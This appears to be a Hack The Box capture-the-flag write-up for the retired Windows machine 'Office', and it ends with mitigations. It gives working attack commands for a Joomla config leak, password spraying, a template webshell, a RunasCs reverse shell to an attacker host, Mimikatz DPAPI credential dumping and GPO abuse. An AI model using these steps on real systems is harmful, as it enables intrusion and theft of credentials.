---
machine: Office
os: Windows
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [windows, active-directory, joomla, cve-2023-23752, kerberos, pcap, libreoffice, cve-2023-2255, dpapi, gpo]
---

# Office — Hack The Box (Windows)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The `office.htb` domain has a Windows Server 2022 domain controller and Joomla on port `80`. CVE-2023-23752 leaks the Joomla configuration and a password belonging to `dwolfe`. With a user list, Kerberos password spraying finds where it is reused; the valid user can read an SMB share holding `Latest-System-Dump-8fbc124d.pcap`, which contains a Kerberos exchange. The hash is cracked and the password opens the Joomla admin panel, where a webshell in a template gives RCE as `web_account`. `RunasCs` reaches `TStark`, and the internal resume site on `8083` is exploited with LibreOffice's CVE-2023-2255 to reach `PPotts`. `HHogan`'s saved credentials are decrypted with Mimikatz and GPO Managers membership allows abusing a GPO to become Administrator.

## Reconnaissance

```bash
nmap -Pn -sCV -p53,80,88,139,389,443,445,464,593,636,3268,3269,5985,9389 <IP>
```

- `53` DNS, `88` Kerberos, `389/636` LDAP, `445` SMB, `5985` WinRM.
- `80` and `443` serve the company site.
- `netexec smb <IP>` identifies `DC` running Windows Server 2022 with domain `office.htb`.

```bash
echo "<IP> office.htb DC.office.htb" >> /etc/hosts
```

## Enumeration

The site runs Joomla 4. The version is vulnerable to CVE-2023-23752, which reads the configuration unauthenticated:

```bash
curl -s "http://office.htb/api/index.php/v1/config/application?public=true"
```

The response includes database credentials; one of them works for `dwolfe`. With a user list from the site and the domain, password spraying begins:

```bash
kerbrute userenum --dc <IP> -d office.htb users.txt
netexec smb <IP> -u users.txt -p '<PASSWORD>' --continue-on-success
```

The valid user reaches an SMB share with a network capture:

```bash
smbclient //<IP>/<SHARE> -U '<DOMAIN>\<USER>%<PASSWORD>'
get Latest-System-Dump-8fbc124d.pcap
```

## Foothold

The PCAP contains a Kerberos authentication between a client and the DC. Wireshark filtering on port `88` yields the `AS-REQ`/`AS-REP` and the hash. With `hashcat` mode `7500` the hash is cracked and the resulting password also opens the Joomla admin panel.

A PHP template is edited and a webshell added. Execution is as `web_account` on the IIS server:

```text
http://office.htb/templates/<TEMPLATE>/<WEBSHELL>.php?cmd=whoami
```

## Lateral movement

`web_account` lacks the required domain rights. With `RunasCs` and `TStark`'s credentials (from the PCAP or enumeration), a shell runs in their context:

```powershell
RunasCs.exe TStark '<PASSWORD>' cmd.exe -r <LHOST>:<LPORT>
```

`TStark` can read the internal resume site listening on `localhost:8083` (`resume.php`). A `chisel` tunnel exposes it to the attacker.

## Privilege escalation

The internal site processes documents. The LibreOffice version is vulnerable to CVE-2023-2255: a document with a floating frame linked to an external file loads that content without prompting. A malicious document is prepared and uploaded as a resume; when opened, the link loads an attacker-controlled file and runs a command, yielding a shell as `PPotts`.

The alternative path is to lower macro security in the registry and send a document with a macro.

`PPotts` has credentials stored in DPAPI. Mimikatz decrypts them and reveals `HHogan`'s:

```powershell
mimikatz# dpapi::cred /in:C:\Users\PPotts\AppData\Local\Microsoft\Credentials\<GUID>
```

`HHogan` is in GPO Managers and has WinRM. `SharpGPOAbuse` modifies a GPO to run a command as Administrator on the DC, or adds an immediate task:

```powershell
SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author <DOMAIN>\Administrator --Command "cmd.exe" --Arguments "/c net localgroup administrators HHogan /add" --GPOName "<GPO>"
```

## Evidence

- `config/application?public=true` with credentials.
- Password spray hitting a valid user.
- `Latest-System-Dump-8fbc124d.pcap` downloaded over SMB.
- Cracked Kerberos hash and Joomla admin access.
- Webshell in a template as `web_account`.
- `RunasCs` and tunnel to the `8083` site.
- CVE-2023-2255 document and shell as `PPotts`.
- `HHogan`'s DPAPI credentials and modified GPO.

## Lessons learned

- A configuration exposure CVE can hand over reused database credentials.
- An internal PCAP holds crackable authentication material.
- A CMS admin panel turns write access into RCE.
- An unexposed internal site is still attackable from the host.
- LibreOffice loads external resources and can execute code without macros.
- DPAPI plus GPO Managers chains a user to Administrator.

## Mitigations and detection

- Update Joomla and restrict `/api` to internal networks.
- Never reuse passwords across databases, users and panels; use service accounts.
- Encrypt and limit network captures; rotate any credentials they contain.
- Disable template editing from the panel and enforce file integrity on web roots.
- Update LibreOffice and block external link loading in documents.
- Protect DPAPI with strong credentials and review who can manage GPOs.
- Alert on `RunasCs`, `chisel` tunnels, GPO changes and execution from templates.

## References

- [0xdf — Office](https://0xdf.gitlab.io/2024/06/22/htb-office.html)
- [IppSec — Office](https://www.youtube.com/watch?v=RZi77SG5KKg)
- [Hack The Box — Office](https://app.hackthebox.com/machines/office)
- [NVD — CVE-2023-23752](https://nvd.nist.gov/vuln/detail/CVE-2023-23752)
- [NVD — CVE-2023-2255](https://nvd.nist.gov/vuln/detail/CVE-2023-2255)
